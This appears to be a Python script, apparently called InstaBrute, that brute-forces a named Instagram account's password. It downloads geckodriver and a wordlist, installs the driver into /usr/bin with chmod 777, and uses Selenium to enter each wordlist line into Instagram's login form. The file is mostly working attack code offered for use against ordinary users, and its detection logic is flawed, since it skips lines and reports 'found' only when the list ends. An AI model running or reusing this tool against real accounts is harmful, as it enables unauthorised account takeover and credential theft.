from selenium.webdriver.chrome.options import Options
from colorama import Fore, Back, Style
from termcolor import colored, cprint
from selenium import webdriver
from zipfile import ZipFile
import colorama
import optparse
import time
import wget
import os



colorama.init()
global nowPath
nowPath = os.getcwd()

def InstallBrowser():
    try:
        print(Fore.GREEN)
        url = 'https://github.com/mozilla/geckodriver/releases/download/v0.28.0/geckodriver-v0.28.0-linux64.tar.gz'
        urlWordlist ="https://raw.githubusercontent.com/OgulcanKacarr/InstaBrute/main/wordlist.txt"
        filename = wget.download(url)
        wordlistDownload = wget.download(urlWordlist)
        print("\n\n")
        os.system("tar -xvf geckodriver-v0.28.0-linux64.tar.gz")
        os.remove("geckodriver-v0.28.0-linux64.tar.gz")
        os.system("cp geckodriver /usr/bin")
        os.system("chmod 777 /usr/bin/geckodriver")
    except KeyboardInterrupt:
        print(Fore.RED)
        print("\nBye bye")


def fileConts():   
    haveOrnotFile = os.path.exists("geckodriver")
    haveOrnotWordlist = os.path.exists("wordlist.txt")
    if haveOrnotFile == False and haveOrnotWordlist == False:
        print(Fore.BLUE)
        print("""

                                                                                                                                                       
                                                                                                      .                                                   
                                                   ...'',,.                                         .''''.....                                            
                                              .'''''''''....                     .'''.              .......''.....                                        
                                         ..''.','...''....     '.     ...  .''. .:ddl.               .................                                    
                                       ..','',,''...''''...''',,.    ,od:..:dd:..;dd;  .:cccc:,.      ..'......'''......                                  
                                    ...'','..''.....'...  ..',,''::. ;ddc. ;dd:..'od;.,odc''::c;..,:;'...........,'..'.....                               
                                 ...'''..''..''.........';'':;::';o, .coo:;cdl.  'od,.'lo:.......,:lcclc'........,'..'.........                           
                              ...'...............,cooolc,..lc.:d;.cl...;c;,'',....;l,...,c:::;..lxo::lod;..,;....'...............                         
                              ....''...........;lol,.;odo' 'c:,,,,;c,........ ..................,::::loc'.cddl:,'.....'...........                        
                             .......'.........:dl'.   ;dd;  .',''.,c,....   .;:;'.,:.  .....'....  ..;;..cddl;,col,....''......'....                      
                          ...........'.'.... 'ddo:....ldo;     ''',..       ;olcooc;.     ....          'dd:. .,ldo....','.....'...'..                    
                        .................'.   ,ooollol:'..                 .co:;ll;,.      .            .''. .cddl.  ..........'..'''....                 
                     .............''.   ...    ....';.                      ,llolcc:'                       .cdc'.   ..   .........'.......               
                     .. ..   ......                                           ...'::.                        ..             ................              
                     ......  .                                              .;:cldc,.                                                ......               
                 .........                                                 .lxoccl,                                                   .''......           
                .......                                                     .,;:coo:.                                                   .',...'.          
              .......                                                            .;;.                                                     ........        
            ..'...                                                          ..     .'.                                                       ....'.       
           .....                                                           .;.      ;;'.                                                       ...''.     
          .....                                                            .;,     .;...                                                        ....'.    
         ....                                                               .,;;;;,,.                                                             .....   
        ...                                                                   ...,;'                                                                ....  
                                                                            ..,;cll:.                                                                     
                                                                           .cdocll,                                                                       
                                                                           .,clcloc,.                                                                     
                                                                              ...;cc.                                                                     
                                                                           .,'.  .,:'                                                                     
                                                                           .;ol;;cl;.                       Oğulcan KAÇAR                                             
                                                                            .;oddl;'.                       github.com/OgulcanKacarr                                              
                                                                           .:lloolc:'.                                                                    
                         .....'...'.......''..'.. .''.                       ......                      ..'....'...'.......'.........                    
                                                                           .........                                                                      
                                                                           ..........                                                                     
                                                                           ..........                                                                     
                                                                           .''....'..                                                                     

        """)
        print(Fore.GREEN)
        print("\n\n[!] please wait, files are uploading..\n")
        print("============================================")
        time.sleep(3)
        try:
            InstallBrowser()
            print(Fore.GREEN)
            print("Download complete")
            print(Fore.RED)
            print("\n[+] use to python3 InstaBrute.py -t <username>")
            exit()
        except KeyboardInterrupt:
            print(Fore.RED)
            print("\nCancel")
            exit()
    else:
        print("fix")

    

def Attack(userAttack):
    haveOrnot = os.path.exists("geckodriver")
    if haveOrnot == False:
        fileConts()
    else:

        try:
            #service_args=['2>/dev/null','--log-path=/tmp/chromedriver.log']
            browser = webdriver.Firefox()
            browser.set_window_position(50, 50)
            browser.set_window_size(500,500)
            browser.get("https://www.instagram.com/")
            time.sleep(3)
            wordlist = open("wordlist.txt","r",encoding="utf-8")
            for Attack in wordlist:
                username = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[1]/div/label/input')
                password = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[2]/div/label/input')
                login = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
                login.click()
                os.system("clear")
                line = wordlist.readline()
                username.send_keys(userAttack)
                password.send_keys(line)

                print(Fore.GREEN,"""

                                

                     [+] trying to password ---> """,line

                    

                )
                print(Fore.RED,"exit >> ctrl+c")
                login.click()
                time.sleep(2)
                browser.refresh()
                time.sleep(2)
            else:
                print(Fore.RED)
                print("Password found (or your wordlist is finished) ---> ",line)
                time.sleep(5)
                wordlist.close()
        except KeyboardInterrupt:
            print(Fore.RED)
            print("\nCancel \ngood bye!")
            time.sleep(3)
            exit()
        except ImportError:
            print(Fore.RED)
            print("\nCancel \ngood bye!")
            time.sleep(3)
            exit()



parseObject = optparse.OptionParser()
print(Fore.GREEN)
parseObject.add_option("-t","--target",dest="userName",help="Instagram username = Ör:// ogulcan_kcr")


(targetUsername,arguments) = parseObject.parse_args()



try:
    Attack(targetUsername.userName)
except AttributeError:
    print("""



                                                                                                            
                                .....''..               ..          ........                            
                             ...''..'...   .    .. .'. .lc.   .      ...........                        
                          ..','''.........','. ,d;.;d;.'ll.'::;:;. .........''....                      
                       ...'''..''..',...'';;;:''ll,:l, .lc.;l;','.,cc:;.....''........                  
                     ............;ccclc.,:,;,;;..,'.....',..',,,.,llcol',:;'............                
                     ..........'cl,..:d,..'.';,.....';,','..........',',oo;;:;...'.......               
                  ..............lo:,,::.   ....    .:lllc'    .        ,:..;ol..............            
                ..........  ..  .'';,.             .;c:::'                ;l,. ..  ...........          
                 ... ...                            .';;:.                ..         ..  ......         
             .....                                 .cooo;.                                .......       
           .....                                    .',;:'                                   .....      
         ....                                       .    ..                                    .....    
        ....                                       .'    ',.                                     ....   
       ...                                          .''.'..                                        ...  
       .                                             .,;:.                                           .  
                                                   .:lll:.                                              
                                                   .';;:c'                                              
                                                   .'. .;,                                              
                                                   .;ccc:'                                              
                                                   .,clc;'                                              
                  ................ ..               .....               .. ................             
                                                   .......                                              
                                                   .'.....                                              
                                                   .,...,.                                       



        """)
    exit()












             
          
